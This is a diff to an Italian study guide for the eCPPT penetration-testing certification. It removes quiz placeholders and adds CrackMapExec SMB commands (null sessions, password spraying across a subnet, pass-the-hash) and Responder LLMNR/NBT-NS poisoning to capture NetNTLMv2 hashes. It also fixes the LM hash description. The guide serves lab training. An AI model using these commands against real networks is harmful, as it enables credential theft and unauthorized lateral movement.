@@ -259,12 +259,6 @@ Filtri utili: `icmp`, `arp`, `tcp.flags.syn==1`. Permette di confermare che i pr
 
 ---
 
-
-
-### Quiz: Methodology, networking & host discovery
-
-<div class="ecppt-quiz" data-module="02_Network_Penetration_Testing" data-block="0"></div>
-
 ## 4. Port scanning: tipi di scan
 
 ### Default scan
@@ -386,12 +380,6 @@ sudo nmap -A 192.31.2.143                                # one-shot aggressive
 NSE script protocol-specific (es. `mongodb-databases`, `smb-os-discovery`) possono rivelare distro + kernel quando `-O` non trova match.
 
 ---
-
-
-
-### Quiz: Port scanning & fingerprinting
-
-<div class="ecppt-quiz" data-module="02_Network_Penetration_Testing" data-block="1"></div>
 
 ## 6. Nmap Scripting Engine (NSE)
 
@@ -535,12 +523,6 @@ Mnemonica: *Paranoid Sneaky Polite Normal Aggressive Insane*.
 
 ---
 
-
-
-### Quiz: NSE, evasione firewall/IDS & timing
-
-<div class="ecppt-quiz" data-module="02_Network_Penetration_Testing" data-block="2"></div>
-
 ## 9. Output formats & Metasploit integration
 
 ### Formati
@@ -660,6 +642,14 @@ enum4linux-ng -A <target>        # Python3, mantenuto
 # NSE enum
 sudo nmap -p 445 --script "smb-enum-users,smb-enum-shares,smb-enum-domains" <target>
 
+# CrackMapExec (CME) — Swiss-Army tool SMB
+crackmapexec smb <target>                                   # info base: OS, SMB version, signing
+crackmapexec smb <target> -u '' -p ''                       # null session
+crackmapexec smb <target> -u user -p pass --shares          # share listing
+crackmapexec smb <target> -u user -p pass --users           # user enum
+crackmapexec smb <subnet>/24 -u user -p pass                # spray su subnet intera
+crackmapexec smb <target> -u user -H <NTHASH> --local-auth  # Pass-the-Hash
+
 # Brute force
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://<target>
 
@@ -768,12 +758,6 @@ sudo nmap -sS -sV -T4 -iL targets.txt -oA multi_scan
 
 ---
 
-
-
-### Quiz: Output Nmap e service enumeration (SMB/SNMP)
-
-<div class="ecppt-quiz" data-module="02_Network_Penetration_Testing" data-block="3"></div>
-
 ## 11. Attack labs
 
 ### 11.1 SMB Relay Attack
@@ -781,6 +765,21 @@ sudo nmap -sS -sV -T4 -iL targets.txt -oA multi_scan
 **Idea**: MITM su traffico SMB. L'attaccante intercetta la negoziazione NTLM del client e la **rilancia live** verso un altro SMB server autenticandosi al posto dell'utente. **Niente cracking** necessario.
 
 **Pre-requisito critico**: **SMB signing disabled** (o `not required`) sul target. Default sui DC = `required`, ma molti file server hanno signing disabled.
+
+#### LLMNR / NBT-NS Poisoning (trigger moderno)
+
+Quando Windows non riesce a risolvere un nome via DNS, usa **LLMNR** (Link-Local Multicast Name Resolution, UDP 5355) e **NBT-NS** (NetBIOS Name Service, UDP 137) — broadcast nella subnet. Un attaccante in ascolto può rispondere **a tutti i broadcast** spacciandosi per il server cercato. Il client risponde con le credenziali NTLM.
+
+```bash
+# Risponde a LLMNR/NBT-NS con il proprio IP per catturare hash
+sudo responder -I eth0 -wd          # -w = WPAD, -d = DHCP (rogue gateway)
+# Cattura NetNTLMv2 hash → /usr/share/responder/logs/
+
+# Solo ascolto (no poisoning, per verifica)
+sudo responder -I eth0 -A
+```
+
+Hash catturati da Responder → crack con Hashcat `-m 5600` (NetNTLMv2) oppure relay diretto con ntlmrelayx.
 
 **Catena**: `arpspoof` (bidirezionale) + `dnsspoof` → vittima parla SMB con noi → relay → Meterpreter su SMBHOST.
 
@@ -1082,7 +1081,7 @@ impacket-psexec -hashes :<NTHASH> administrator@<target>
 | Tipo | Cos'è | Dove si ottiene | Hashcat mode |
 |---|---|---|---|
 | **NT hash** (NTLM) | MD4 della password Unicode, locale | Dump SAM/LSASS | **1000** |
-| **LM hash** | Legacy, MD5-based, max 14 char, no Unicode | Win pre-Vista | **3000** |
+| **LM hash** | Legacy, DES-based, max 14 char, no Unicode, case-insensitive | Win pre-Vista | **3000** |
 | **NetNTLMv1** | Challenge-response su rete (SMB/HTTP), DES-based | Sniff / Responder | **5500** |
 | **NetNTLMv2** | Challenge-response più robusta (HMAC-MD5) | Sniff / Responder | **5600** |
 | **Kerberos TGS-REP** | Ticket Kerberoasting | AD attacks | **13100** |
@@ -1196,12 +1195,6 @@ ssh administrator@127.0.0.1 -p 1234
 > 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Nmap & Scanning](../10_Cheatsheet.md#nmap-scanning).
 
 ---
-
-
-
-### Quiz: Attack labs (SMB Relay, MSSQL, NTLM) & Nmap master
-
-<div class="ecppt-quiz" data-module="02_Network_Penetration_Testing" data-block="4"></div>
 
 ## 13. Cheat sheet Hashcat modes
 
@@ -1332,6 +1325,8 @@ snmp-check -c public -v 1 <target>
 snmpwalk -v2c -c public <target>
 ```
 
+---
+
 ### Mindset lab
 
 - **Enum esaustivo PRIMA di exploit**. Mai saltare alla fase exploit senza aver enumerato tutto.
@@ -1352,12 +1347,6 @@ snmpwalk -v2c -c public <target>
 - **C2 frameworks** → corso dedicato.
 
 ---
-
-
-
-### Quiz: Hashcat, porte e punti d'attenzione eCPPT
-
-<div class="ecppt-quiz" data-module="02_Network_Penetration_Testing" data-block="5"></div>
 
 ## Indice video sorgente
 
